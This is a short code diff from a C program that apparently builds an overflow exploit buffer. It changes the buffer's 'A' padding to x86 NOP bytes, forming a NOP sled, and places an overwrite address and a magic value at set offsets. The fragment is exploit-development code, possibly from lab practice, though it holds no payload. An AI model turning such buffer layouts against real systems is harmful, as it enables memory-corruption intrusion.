@@ -48,7 +48,7 @@ int main()
 	LPVOID plAddress = &pla;
 	byte Buff[0x830] = { 0 };
 
-	memset(Buff,'\x41',0x830);
+	memset(Buff,'\x90',0x830);
 	memcpy(Buff + 0x828, plAddress, 4);
 	memcpy(Buff + 0x830 - 4, "\xb0\xb0\xd0\xba", 4);
 
